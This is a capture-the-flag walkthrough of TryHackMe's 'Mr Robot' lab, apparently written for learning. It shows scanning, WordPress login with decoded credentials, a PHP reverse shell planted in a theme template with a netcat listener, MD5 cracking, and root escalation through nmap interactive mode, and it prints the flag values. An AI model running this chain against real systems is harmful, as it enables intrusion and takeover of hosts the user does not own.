# Mr Robot CTF @TryHackMe

Difficulty: MEDIUM

Keywords and tools: 

### Check that host is alive
```                                                                            
$ ping <target_ip> 
```
### nmap scans
```
$ nmap -sV -n -v -Pn -p- -T4 -A 10.10.193.239
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-26 05:43 EST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 05:43
Completed NSE at 05:43, 0.00s elapsed
Initiating NSE at 05:43
Completed NSE at 05:43, 0.00s elapsed
Initiating NSE at 05:43
Completed NSE at 05:43, 0.00s elapsed
Initiating Connect Scan at 05:43
Scanning 10.10.193.239 [65535 ports]
Discovered open port 80/tcp on 10.10.193.239
Discovered open port 443/tcp on 10.10.193.239
Connect Scan Timing: About 8.97% done; ETC: 05:49 (0:05:15 remaining)
Connect Scan Timing: About 21.39% done; ETC: 05:48 (0:03:44 remaining)
Connect Scan Timing: About 48.07% done; ETC: 05:46 (0:01:38 remaining)
Completed Connect Scan at 05:45, 135.75s elapsed (65535 total ports)
Initiating Service scan at 05:45
Scanning 2 services on 10.10.193.239
Completed Service scan at 05:45, 12.39s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.193.239.
Initiating NSE at 05:45
Completed NSE at 05:46, 18.02s elapsed
Initiating NSE at 05:46
Completed NSE at 05:46, 0.41s elapsed
Initiating NSE at 05:46
Completed NSE at 05:46, 0.00s elapsed
Nmap scan report for 10.10.193.239
Host is up (0.047s latency).
Not shown: 65532 filtered ports
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=www.example.com
| Issuer: commonName=www.example.com
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2015-09-16T10:45:03
| Not valid after:  2025-09-13T10:45:03
| MD5:   3c16 3b19 87c3 42ad 6634 c1c9 d0aa fb97
|_SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b
```
We have ports 80 and 443 open.

### Lets run dirb
```
---- Scanning URL: http://10.10.193.239/ ----
==> DIRECTORY: http://10.10.193.239/0/                                                                                                                       
==> DIRECTORY: http://10.10.193.239/admin/                                                                                                                   
+ http://10.10.193.239/atom (CODE:301|SIZE:0)                                                                                                                
==> DIRECTORY: http://10.10.193.239/audio/                                                                                                                   
==> DIRECTORY: http://10.10.193.239/blog/                                                                                                                    
==> DIRECTORY: http://10.10.193.239/css/                                                                                                                     
+ http://10.10.193.239/dashboard (CODE:302|SIZE:0)                                                                                                           
+ http://10.10.193.239/favicon.ico (CODE:200|SIZE:0)                                                                                                         
==> DIRECTORY: http://10.10.193.239/feed/                                                                                                                    
==> DIRECTORY: http://10.10.193.239/image/                                                                                                                   
==> DIRECTORY: http://10.10.193.239/Image/                                                                                                                   
==> DIRECTORY: http://10.10.193.239/images/                                                                                                                  
+ http://10.10.193.239/index.html (CODE:200|SIZE:1077)                                                                                                       
+ http://10.10.193.239/index.php (CODE:301|SIZE:0)                                                                                                           
+ http://10.10.193.239/intro (CODE:200|SIZE:516314)                                                                                                          
==> DIRECTORY: http://10.10.193.239/js/                                                                                                                      
+ http://10.10.193.239/license (CODE:200|SIZE:309)                                                                                                           
+ http://10.10.193.239/login (CODE:302|SIZE:0)                                                                                                               
+ http://10.10.193.239/page1 (CODE:301|SIZE:0)                                                                                                               
+ http://10.10.193.239/phpmyadmin (CODE:403|SIZE:94)                                                                                                         
+ http://10.10.193.239/rdf (CODE:301|SIZE:0)                                                                                                                 
+ http://10.10.193.239/readme (CODE:200|SIZE:64)                                                                                                             
+ http://10.10.193.239/robots (CODE:200|SIZE:41)                                                                                                             
+ http://10.10.193.239/robots.txt (CODE:200|SIZE:41)                                                                                                         
+ http://10.10.193.239/rss (CODE:301|SIZE:0)                                                                                                                 
+ http://10.10.193.239/rss2 (CODE:301|SIZE:0)                                                                                                                
+ http://10.10.193.239/sitemap (CODE:200|SIZE:0)                                                                                                             
+ http://10.10.193.239/sitemap.xml (CODE:200|SIZE:0)                                                                                                         
==> DIRECTORY: http://10.10.193.239/video/                                                                                                                   
==> DIRECTORY: http://10.10.193.239/wp-admin/                                                                                                                
+ http://10.10.193.239/wp-config (CODE:200|SIZE:0)                                                                                                           
==> DIRECTORY: http://10.10.193.239/wp-content/                                                                                                              
+ http://10.10.193.239/wp-cron (CODE:200|SIZE:0)                                                                                                             
==> DIRECTORY: http://10.10.193.239/wp-includes/                                                                                                             
+ http://10.10.193.239/wp-links-opml (CODE:200|SIZE:227)                                                                                                     
+ http://10.10.193.239/wp-load (CODE:200|SIZE:0)                                                                                                             
+ http://10.10.193.239/wp-login (CODE:200|SIZE:2613)                                                                                                         
+ http://10.10.193.239/wp-mail (CODE:500|SIZE:3064)                                                                                                          
+ http://10.10.193.239/wp-settings (CODE:500|SIZE:0)                                                                                                         
+ http://10.10.193.239/wp-signup (CODE:302|SIZE:0)                                                                                                           
+ http://10.10.193.239/xmlrpc (CODE:405|SIZE:42)                                                                                                             
+ http://10.10.193.239/xmlrpc.php (CODE:405|SIZE:42)  
```
### Lets visit the pages via browser

/robots.txt gives us

User-agent: *
fsocity.dic
key-1-of-3.txt

Visiting page /key-1-of-3.txt gives us the first key.


From page /fsocity.dic we get a huge list of possibly passwords and usernames?

We can reduce it's size
```
sort fsocity.dic | uniq > fsocity.uniq
```
/license page had "ZWxsaW90OkVSMjgtMDY1Mgo=" which is BASE64 and can be decoded (https://www.base64decode.org/) to elliot:ER28-0652

As login page /wp-login.php is accessable (or /dashboard) we could try logins we found.

Credentials work.

### Install a web shell.

Uploading php files is not allowed and adding plugins times out. So we will do it by editing themes.
Quick google search: https://raw.githubusercontent.com/tutorial0/WebShell/master/Php/php-reverse-shell.php
Copy the code 404 Template and set IP & port.
Start netcat listener on the desired port and visit http://<target_ip>/404.php

```
$ nc -lvnp 4444

listening on [any] 4444 ...
connect to [10.8.155.124] from (UNKNOWN) [10.10.206.23] 53215
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 16:31:01 up 20 min,  0 users,  load average: 0.00, 0.06, 0.24
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
daemon
$ cd /home
$ ls
robot
$ cd robot
$ ls
key-2-of-3.txt
password.raw-md5
$ cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied
$ cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```
We have no rights to the second key, but we can crack a found hash.
```
$john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
abcdefghijklmnopqrstuvwxyz (robot)
1g 0:00:00:00 DONE (2021-01-26 11:43) 33.33g/s 1350Kp/s 1350Kc/s 1350KC/s bonjour1..123092
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed
```
Upgrade netcat to proper shell
```
python -c 'import pty;pty.spawn("/bin/bash")'
daemon@linux:/home/robot$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz
robot@linux:~$ cd /home/robot
cd /home/robot
robot@linux:~$ ls
ls
key-2-of-3.txt	password.raw-md5
robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```
And we have the second key.

### Privilege escalation.
```
robot@linux:/$ sudo -l
sudo -l
[sudo] password for robot: abcdefghijklmnopqrstuvwxyz

Sorry, user robot may not run sudo on linux.
```
Third keys hint is nmap.
Quick google: https://gtfobins.github.io/gtfobins/nmap/

nmap --interactive
nmap> !sh

```
robot@linux:/$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
# whoami
whoami
root
# cd /root
cd /root
# ls
ls
firstboot_done	key-3-of-3.txt
# cat key-3-of-3.txt
cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```
And we have our third key.
